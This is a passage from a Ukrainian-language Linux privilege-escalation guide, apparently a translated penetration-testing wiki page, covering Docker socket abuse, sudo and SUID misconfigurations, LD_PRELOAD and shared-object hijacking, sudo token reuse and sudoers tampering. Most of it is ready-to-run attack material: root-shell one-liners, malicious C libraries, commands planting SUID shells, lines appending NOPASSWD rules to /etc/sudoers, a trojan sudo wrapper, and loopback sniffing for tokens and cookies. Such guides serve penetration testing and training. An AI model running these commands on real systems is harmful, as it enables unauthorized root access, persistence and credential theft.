Docker сокет, який часто знаходиться за шляхом `/var/run/docker.sock`, — це критичний файл, який слід захистити. За замовчуванням він доступний для запису користувачу `root` та членам групи `docker`. Маючи права запису до цього сокета, можна досягти privilege escalation. Нижче наведено розбивку того, як це можна зробити, а також альтернативні методи, якщо Docker CLI недоступний.

#### **Privilege Escalation with Docker CLI**

Якщо у вас є права запису до Docker сокета, ви можете escalate privileges, використовуючи такі команди:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Ці команди дозволяють запустити container з доступом рівня root до файлової системи хоста.

#### **Using Docker API Directly**

Якщо Docker CLI недоступний, Docker socket усе ще можна маніпулювати за допомогою Docker API та `curl` команд.

1.  **List Docker Images:** Отримати список доступних образів.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Надіслати запит на створення контейнера, який монтує кореневий каталог хоста.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Запустіть щойно створений container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Використайте `socat`, щоб встановити з’єднання з контейнером і отримати можливість виконувати команди в ньому.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Після налаштування `socat` з’єднання ви зможете виконувати команди безпосередньо в контейнері з доступом root до файлової системи хоста.

### Others

Зауважте, що якщо у вас є права запису до docker socket, тому що ви **inside the group `docker`**, у вас є [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group). Якщо [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Перевірте **more ways to break out from containers or abuse container runtimes to escalate privileges** у:

{{#ref}}
container-security/
{{#endref}}

## Containerd (ctr) privilege escalation

Якщо ви виявите, що можете використати команду **`ctr`**, прочитайте наступну сторінку, оскільки **you may be able to abuse it to escalate privileges**:

{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

Якщо ви виявите, що можете використати команду **`runc`**, прочитайте наступну сторінку, оскільки **you may be able to abuse it to escalate privileges**:

{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus — це складна система **inter-Process Communication (IPC) system**, яка дозволяє додаткам ефективно взаємодіяти та обмінюватися даними. Розроблена з урахуванням сучасної системи Linux, вона пропонує надійну основу для різних форм комунікації між додатками.

Система є гнучкою: вона підтримує базовий IPC, що покращує обмін даними між процесами, нагадуючи **enhanced UNIX domain sockets**. Крім того, вона допомагає транслювати події або сигнали, сприяючи безшовній інтеграції компонентів системи. Наприклад, сигнал від Bluetooth daemon про вхідний дзвінок може змусити музичний плеєр приглушити звук, покращуючи досвід користувача. Додатково, D-Bus підтримує систему віддалених об’єктів, що спрощує запити сервісів і виклики методів між додатками, оптимізуючи процеси, які раніше були складнішими.

D-Bus працює за моделлю **allow/deny model**, керуючи дозволами на повідомлення (виклики методів, емісії сигналів тощо) на основі кумулятивного ефекту правил політики, що збігаються. Ці політики визначають взаємодії з шиною, потенційно дозволяючи privilege escalation через експлуатацію цих дозволів.

Наведено приклад такої політики в `/etc/dbus-1/system.d/wpa_supplicant.conf`, що деталізує дозволи для користувача root на володіння, надсилання та отримання повідомлень від `fi.w1.wpa_supplicant1`.

Політики без зазначеного користувача або групи застосовуються універсально, тоді як політики в контексті "default" застосовуються до всіх, хто не покривається іншими специфічними політиками.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Дізнайтеся, як проводити енумерацію та експлуатувати D-Bus-зв'язок тут:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Мережа**

Завжди цікаво виконати енумерацію мережі та з'ясувати розташування машини.

### Загальна енумерація
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```
### Швидкий триаж фільтрації вихідного трафіку

Якщо хост може виконувати команди, але callbacks не працюють, швидко відокремте фільтрацію DNS, transport, proxy та route:
```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```
### Відкриті порти

Завжди перевіряйте мережеві служби, що працюють на машині, з якими ви не могли взаємодіяти до отримання доступу:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```
Класифікуйте слухачів за ціллю прив'язки:

- `0.0.0.0` / `[::]`: відкриті на всіх локальних інтерфейсах.
- `127.0.0.1` / `::1`: лише локальні (хороші кандидати для tunnel/forward).
- Конкретні внутрішні IP-адреси (наприклад `10.x`, `172.16/12`, `192.168.x`, `fe80::`): зазвичай доступні лише з внутрішніх сегментів.

### Процес триажу локальних сервісів

Коли ви компрометуєте хост, сервіси, прив'язані до `127.0.0.1`, часто вперше стають доступними з вашого shell. Швидка локальна послідовність дій:
```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```
### LinPEAS як мережевий сканер (режим лише мережі)

Окрім локальних PE checks, linPEAS може працювати як спеціалізований мережевий сканер. linPEAS використовує доступні бінарні файли в `$PATH` (зазвичай `fping`, `ping`, `nc`, `ncat`) і не встановлює tooling.
```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```
If you pass `-d`, `-p`, or `-i` without `-t`, linPEAS поводиться як чистий мережевий сканер (пропускаючи решту перевірок privilege-escalation).

### Sniffing

Перевірте, чи можете ви sniff traffic. Якщо можете, ви зможете отримати деякі credentials.
```
timeout 1 tcpdump
```
Швидкі практичні перевірки:
```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```
Loopback (`lo`) особливо цінний у post-exploitation, оскільки багато внутрішніх сервісів там надають tokens/cookies/credentials:
```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
| egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```
Захоплюйте зараз, аналізуйте пізніше:
```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
-T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```
## Користувачі

### Загальна перевірка

Перевірте **хто** ви, які **privileges** у вас є, які **users** є в системі, хто може **login** і які мають **root privileges**:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

Деякі версії Linux були вражені багом, який дозволяє користувачам з **UID > INT_MAX** підвищувати привілеї. Більше інформації: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Експлуатуйте** за допомогою: **`systemd-run -t /bin/bash`**

### Групи

Перевірте, чи ви є **членом якої-небудь групи**, яка може надати вам root привілеї:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Clipboard

Перевірте, чи в буфері обміну є щось цікаве (якщо це можливо)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Політика паролів
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Відомі passwords

Якщо ви **знаєте будь-який password** у середовищі **спробуйте увійти під кожного користувача**, використовуючи цей password.

### Su Brute

Якщо вам не шкода створити багато шуму і бінарні файли `su` та `timeout` присутні на машині, ви можете спробувати brute-force користувача за допомогою [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) з параметром `-a` також намагається brute-force користувачів.

## Зловживання записуваним $PATH

### $PATH

Якщо ви виявили, що можете **записувати в деяку папку з $PATH**, ви можете підвищити привілеї, **створивши backdoor у записуваній папці** з іменем якоїсь команди, яка буде виконуватись іншим користувачем (бажано root) і яка **не завантажується з папки, що знаходиться раніше** за вашу записувану папку в $PATH.

### SUDO and SUID

Вам може бути дозволено виконувати певну команду через sudo або команда може мати suid bit. Перевірте це за допомогою:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Деякі **неочікувані команди дозволяють читати та/або записувати файли або навіть виконувати команду.** Наприклад:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Конфігурація Sudo може дозволяти користувачеві виконувати певну команду з привілеями іншого користувача без знання пароля.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
У цьому прикладі користувач `demo` може запускати `vim` як `root`; тепер отримати shell тривіально — додавши ssh key у директорію `root` або викликавши `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Ця директива дозволяє користувачу **встановити змінну середовища** під час виконання чогось:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Цей приклад, **based on HTB machine Admirer**, був **vulnerable** до **PYTHONPATH hijacking**, що дозволяв завантажити довільну python бібліотеку під час виконання скрипту з правами root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV збережений через sudo env_keep → root shell

Якщо sudoers зберігає `BASH_ENV` (наприклад, `Defaults env_keep+="ENV BASH_ENV"`), ви можете використати неінтерактивну поведінку запуску Bash, щоб виконати довільний код як root при виклику дозволеної команди.

- Чому це працює: Для неінтерактивних shell-ів, Bash оцінює `$BASH_ENV` і підвантажує вміст цього файлу перед виконанням цільового скрипта. Багато sudo правил дозволяють запуск скрипта або shell wrapper. Якщо `BASH_ENV` збережено sudo, ваш файл буде підвантажений із привілеями root.

- Вимоги:
- Правило sudo, яке ви можете виконати (будь-яка ціль, що викликає `/bin/bash` неінтерактивно, або будь-який bash-скрипт).
- `BASH_ENV` присутній в `env_keep` (перевірте за допомогою `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Hardening:
- Видаліть `BASH_ENV` (та `ENV`) з `env_keep`, надавайте перевагу `env_reset`.
- Уникайте shell-обгорток для команд, дозволених через sudo; використовуйте мінімальні бінарні файли.
- Розгляньте логування I/O sudo та сповіщення при використанні збережених env vars.

### Terraform через sudo зі збереженим HOME (!env_reset)

Якщо sudo залишає середовище цілим (`!env_reset`) одночасно дозволяючи виконання `terraform apply`, `$HOME` залишається у викликаючого користувача. Тому Terraform завантажує **$HOME/.terraformrc** від імені root і враховує `provider_installation.dev_overrides`.

- Вкажіть потрібному provider'у директорію з правами запису і помістіть туди зловмисний плагін, названий іменем провайдера (наприклад, `terraform-provider-examples`):
```hcl
# ~/.terraformrc
provider_installation {
dev_overrides {
"previous.htb/terraform/examples" = "/dev/shm"
}
direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```
Terraform не пройде Go plugin handshake, але виконає payload під root перед припиненням роботи, залишаючи SUID shell.

### TF_VAR перевизначення + обхід перевірки symlink

Змінні Terraform можна передавати через змінні середовища `TF_VAR_<name>`, які зберігаються, коли sudo зберігає середовище. Слабкі перевірки, такі як `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")`, можна обійти за допомогою symlinks:
```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```
Terraform розв'язує symlink і копіює реальний `/root/root.txt` до місця, доступного для читання атакуючим. Такий самий підхід можна використати, щоб **записати** у привілейовані шляхи, попередньо створивши цільові symlinks (наприклад, вказавши шлях призначення провайдера всередині `/etc/cron.d/`).

### requiretty / !requiretty

У деяких старіших дистрибутивах sudo може бути налаштований з `requiretty`, що змушує sudo запускатися лише з інтерактивного TTY. Якщо встановлено `!requiretty` (або опція відсутня), sudo може виконуватися з неінтерактивних контекстів, таких як reverse shells, cron jobs, або скрипти.
```bash
Defaults !requiretty
```
Це саме по собі не є прямою вразливістю, але розширює ситуації, в яких правила sudo можна зловживати без потреби повного PTY.

### Sudo env_keep+=PATH / ненадійний secure_path → PATH hijack

Якщо `sudo -l` показує `env_keep+=PATH` або `secure_path`, що містить записи, доступні для запису нападнику (наприклад, `/home/<user>/bin`), будь-яка відносна команда всередині sudo-дозволеної цілі може бути підмінена.

- Вимоги: правило sudo (часто `NOPASSWD`), що запускає скрипт/бінарний файл, який викликає команди без абсолютних шляхів (`free`, `df`, `ps`, тощо) та запис в PATH, доступний для запису і який перевіряється першим.
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Sudo: обхід шляхів виконання
**Перейдіть**, щоб прочитати інші файли або використовуйте **symlinks**. Наприклад, у файлі sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Якщо використовується **wildcard** (\*), це ще простіше:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Контрзаходи**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary без шляху до команди

Якщо користувачу надано **sudo permission** для однієї команди **без вказання шляху**: _hacker10 ALL= (root) less_ — ви можете експлуатувати це, змінивши змінну PATH
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Цю техніку також можна використовувати, якщо **suid** бінарний файл **виконує іншу команду без вказання шляху до неї (завжди перевіряйте вміст дивного SUID бінарного файлу за допомогою** _**strings**_**)**.

[Payload examples to execute.](payloads-to-execute.md)

### SUID бінарний файл із вказаним шляхом до команди

Якщо **suid** бінарний файл **виконує іншу команду, вказуючи шлях**, тоді ви можете спробувати **експортувати функцію** з назвою тієї команди, яку викликає suid файл.

Наприклад, якщо suid бінарний файл викликає _**/usr/sbin/service apache2 start**_, потрібно спробувати створити функцію та експортувати її:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Коли ви викликаєте suid бінарний файл, ця функція буде виконана

### Writable script executed by a SUID wrapper

Типова неправильна конфігурація custom-app — root-owned SUID binary wrapper, який виконує script, тоді як сам script доступний для запису low-priv користувачами.

Типовий шаблон:
```c
int main(void) {
system("/bin/bash /usr/local/bin/backup.sh");
}
```
Якщо `/usr/local/bin/backup.sh` доступний для запису, ви можете додати payload commands, а потім виконати SUID wrapper:
```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```
Швидкі перевірки:
```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```
This attack path is especially common in "maintenance"/"backup" wrappers shipped in `/usr/local/bin`.

### LD_PRELOAD & **LD_LIBRARY_PATH**

Змінна середовища **LD_PRELOAD** використовується для вказівки однієї або кількох спільних бібліотек (.so файлів), які завантажувач повинен підвантажити перед усіма іншими, включно зі стандартною бібліотекою C (`libc.so`). Цей процес називається попереднім завантаженням бібліотеки.

Однак, щоб зберегти безпеку системи й запобігти зловживанням цією можливістю, особливо у випадку **suid/sgid** виконуваних файлів, система застосовує певні обмеження:

- Завантажувач ігнорує **LD_PRELOAD** для виконуваних файлів, у яких реальний ідентифікатор користувача (_ruid_) не збігається з ефективним ідентифікатором користувача (_euid_).
- Для виконуваних файлів з suid/sgid попередньо завантажуються лише бібліотеки зі стандартних шляхів, які також мають suid/sgid.

Підвищення привілеїв може статися, якщо ви маєте можливість виконувати команди через `sudo`, і вивід `sudo -l` містить запис **env_keep+=LD_PRELOAD**. Така конфігурація дозволяє змінній середовища **LD_PRELOAD** зберігатися й враховуватися навіть під час запуску команд через `sudo`, потенційно призводячи до виконання довільного коду з підвищеними привілеями.
```
Defaults        env_keep += LD_PRELOAD
```
Збережіть як **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Тоді **скомпілюйте його** за допомогою:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Нарешті, **escalate privileges** під час виконання
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Аналогічний privesc може бути використаний, якщо attacker контролює **LD_LIBRARY_PATH** env variable, тому що він контролює шлях, де будуть шукатися бібліотеки.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Коли ви натрапляєте на binary з правами **SUID**, який здається підозрілим, корисно перевірити, чи він правильно завантажує **.so** файли. Це можна перевірити, виконавши таку команду:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Наприклад, поява помилки на кшталт _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ свідчить про можливість експлуатації.

Щоб це експлуатувати, потрібно створити C-файл, наприклад _"/path/to/.config/libcalc.c"_, який містить наступний код:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Цей код, після компіляції та виконання, має на меті підвищити привілеї шляхом маніпулювання правами доступу до файлів та запуску shell з підвищеними привілеями.

Скомпілюйте наведений вище файл C у shared object (.so) за допомогою:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Нарешті, запуск ураженого SUID binary має викликати exploit, що може призвести до compromise системи.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Тепер, коли ми знайшли SUID бінарний файл, який завантажує бібліотеку з папки, в яку ми можемо записувати, створімо бібліотеку в цій папці з потрібною назвою:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Якщо ви отримаєте помилку на кшталт
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
це означає, що згенерована бібліотека повинна містити функцію з назвою `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) — це кураторський перелік Unix-утиліт, які можуть бути використані атакуючим для обходу локальних обмежень безпеки. [**GTFOArgs**](https://gtfoargs.github.io/) — те саме, але для випадків, коли ви можете **вставляти лише аргументи** в команду.

Проєкт збирає легітимні функції Unix-утиліт, які можна зловживати для виходу з restricted shells, підвищення або збереження elevated privileges, передачі файлів, створення bind і reverse shells та полегшення інших post-exploitation задач.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Якщо ви маєте доступ до `sudo -l`, ви можете використати інструмент [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo), щоб перевірити, чи він знаходить спосіб експлуатувати будь-яке правило sudo.

### Reusing Sudo Tokens

У випадках, коли у вас є **sudo access**, але немає пароля, ви можете підвищити привілеї, **чекаючи виконання команди sudo, а потім перехопивши токен сесії**.

Вимоги для підвищення привілеїв:

- Ви вже маєте shell як користувач "_sampleuser_"
- "_sampleuser_" використав **`sudo`** для виконання чогось протягом **останніх 15mins** (за замовчуванням це тривалість sudo token, що дозволяє нам використовувати `sudo` без введення пароля)
- `cat /proc/sys/kernel/yama/ptrace_scope` має значення 0
- `gdb` доступний (ви можете завантажити його)

(Ви можете тимчасово увімкнути `ptrace_scope` за допомогою `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` або постійно модифікувавши `/etc/sysctl.d/10-ptrace.conf` і встановивши `kernel.yama.ptrace_scope = 0`)

Якщо всі ці вимоги виконані, **ви можете підвищити привілеї, використовуючи:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) will create the binary `activate_sudo_token` in _/tmp_. You can use it to **activate the sudo token in your session** (you won't get automatically a root shell, do `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **другий exploit** (`exploit_v2.sh`) створить sh shell у _/tmp_ **що належить root і має setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **третій exploit** (`exploit_v3.sh`) **створить файл sudoers**, який робить **sudo tokens вічними та дозволяє всім користувачам використовувати sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Якщо у вас є **права на запис** у цю папку або на будь-який із файлів, створених всередині папки, ви можете використати бінарник [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) щоб **створити sudo token для користувача та PID**.\
Наприклад, якщо ви можете перезаписати файл _/var/run/sudo/ts/sampleuser_ і маєте shell під цим користувачем з PID 1234, ви можете **отримати sudo привілеї** без необхідності знати пароль, виконавши:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Файл `/etc/sudoers` і файли всередині `/etc/sudoers.d` налаштовують, хто може використовувати `sudo` і як. **За замовчуванням ці файли можуть читатися тільки користувачем root та групою root**.\
**Якщо** ви можете **прочитати** цей файл, ви зможете **отримати деяку цікаву інформацію**, а якщо ви можете **записати** будь-який файл — ви зможете **escalate privileges**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Якщо у вас є право запису, ви можете зловживати цим дозволом.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Інший спосіб зловживати цими дозволами:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Існують альтернативи бінарному файлу `sudo`, такі як `doas` для OpenBSD — не забудьте перевірити його конфігурацію в `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Якщо ви знаєте, що **користувач зазвичай підключається до машини і використовує `sudo`** для підвищення привілеїв і у вас є shell у контексті цього користувача, ви можете **створити новий виконуваний файл sudo**, який виконає ваш код від імені root, а потім команду користувача. Потім **змініть $PATH** контексту користувача (наприклад додавши новий шлях у .bash_profile), щоб коли користувач виконуватиме sudo, запускався ваш виконуваний файл sudo.

Зверніть увагу, що якщо користувач використовує інший shell (не bash), вам доведеться змінити інші файли, щоб додати новий шлях. Наприклад[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) змінює `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Інший приклад можна знайти в [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Або запустивши щось на кшталт:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Спільна бібліотека

### ld.so

Файл `/etc/ld.so.conf` вказує, **звідки завантажуються конфігураційні файли**. Зазвичай цей файл містить такий рядок: `include /etc/ld.so.conf.d/*.conf`

Це означає, що будуть зчитані конфігураційні файли з `/etc/ld.so.conf.d/*.conf`. Ці конфігураційні файли **вказують на інші папки**, в яких буде **відбуватися пошук бібліотек**. Наприклад, вміст `/etc/ld.so.conf.d/libc.conf` — це `/usr/local/lib`. **Це означає, що система шукатиме бібліотеки всередині `/usr/local/lib`**.

Якщо з якоїсь причини **користувач має права на запис** у будь-який із зазначених шляхів: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, будь-який файл всередині `/etc/ld.so.conf.d/` або будь-яку папку, вказану в конфігураційному файлі всередині `/etc/ld.so.conf.d/*.conf`, він може бути здатний escalate privileges.\
